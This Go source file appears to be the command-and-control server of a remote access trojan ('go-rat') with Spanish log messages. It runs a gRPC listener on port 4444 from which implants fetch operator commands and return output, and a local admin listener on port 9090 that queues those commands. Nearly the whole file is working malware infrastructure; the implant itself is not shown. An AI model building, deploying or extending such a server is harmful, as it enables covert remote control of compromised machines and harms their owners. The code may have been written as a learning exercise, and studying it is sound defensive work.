package main

import (
	"context"
	"errors"
	"fmt"
	"github.com/charmbracelet/lipgloss"
	"github.com/charmbracelet/log"
	"github.com/iortego42/go-rat/grpcapi"
	"google.golang.org/grpc"
	"net"
	"os"
	"time"
)

var l = new(log.Logger)

type implantServer struct {
	work, output chan *grpcapi.Command
	grpcapi.ImplantServer
}

type adminServer struct {
	work, output chan *grpcapi.Command
	grpcapi.AdminServer
}

func newImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

func newAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	cmd := new(grpcapi.Command)

	select {
	case cmd, ok := <-s.work:
		log.Debug("[+] Comando recibido del administrador.", "CMD", cmd.In)
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	log.Debug("[*] Resultado enviado al administrador.")
	return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, command *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	go func() {
		s.work <- command
	}()
	log.Debug("[*] Enviado comando al Servidor.", "CMD", command.In)
	res = <-s.output
	log.Debug("[*] Resultado recibido.")
	return res, nil
}

func initLogger() {
	styles := log.DefaultStyles()
	styles.Levels[log.InfoLevel] = lipgloss.NewStyle().
		SetString("[*]").
		Bold(true).
		Foreground(lipgloss.Color("#87ceeb")).
		Padding(0, 1, 0, 1)
	styles.Levels[log.ErrorLevel] = lipgloss.NewStyle().
		SetString("[!]").
		Bold(true).
		Padding(0, 1, 0, 1).
		Foreground(lipgloss.Color("204"))
	logger := log.NewWithOptions(os.Stderr, log.Options{
		Prefix:          "RAT 🤖",
		ReportTimestamp: true,
		TimeFormat:      time.TimeOnly,
	})
	logger.SetStyles(styles)
	l = logger
}

func main() {
	var (
		implantListener, adminListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
		work, output                   chan *grpcapi.Command
	)
	initLogger()
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implant := newImplantServer(work, output)
	admin := newAdminServer(work, output)
	client_addr := ":9090"
	implant_addr := ":4444"
	if implantListener, err = net.Listen("tcp", implant_addr); err != nil {
		log.Debug(implantListener)
		log.Fatal("Error en el listener del implant", "ERROR", err)
	}

	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
		log.Debug(adminListener)
		log.Fatal("Error en el listener del admin", "ERROR", err)
	}

	if adminListener == nil || implantListener == nil {
		log.Fatal("[!] No se puede escuchar.", "ERROR", "Los listeners son nil!!!")
	}

	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	if grpcAdminServer == nil || admin == nil {
		log.Fatal("grpcAdmin server es nulo")
	}
	if grpcImplantServer == nil || implant == nil {
		log.Fatal("grpcAdmin server es nulo")
	}
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	go func() {
		l.Infof("ImplantListener escuchando en %s", implant_addr)
		err = grpcImplantServer.Serve(implantListener)
		if err != nil {
			log.Fatal(err)
		}
	}()
	l.Errorf("this is a test")
	l.Infof("AdminListener escuchando en %s", client_addr)
	err = grpcAdminServer.Serve(adminListener)
	if err != nil {
		log.Fatal(err)
	}

}
